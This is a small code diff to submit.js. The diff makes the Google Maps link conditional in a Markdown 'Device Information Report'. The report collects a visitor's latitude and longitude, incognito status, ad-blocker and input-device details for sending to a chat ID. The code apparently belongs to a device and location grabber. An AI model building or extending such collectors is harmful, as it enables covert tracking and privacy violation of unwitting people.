@@ -1,4 +1,4 @@
-// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section + proper bold/italic Markdown)
+// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection + proper bold/italic Markdown + conditional Map View)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -196,6 +196,11 @@ async function collectAndSend(chatId) {
     }
   } catch (e) {}
 
+  // Conditional Map View
+  const mapView = (geoResult.latitude !== 'Denied' && geoResult.longitude !== 'Denied') 
+                  ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}`
+                  : 'Unavailable';
+
   // Build message with Markdown formatting
   const message = 
 `🔰 *Device Information Report* 🔰
@@ -231,7 +236,7 @@ _𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘�
 - Status: ${geoResult.status}
 - Latitude: \`${geoResult.latitude}\`
 - Longitude: \`${geoResult.longitude}\`
-- Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
+- Map View: ${mapView}
 
 🔐 *Privacy & Blockers Info:*
 - Incognito / Private Mode: ${incognitoResult}
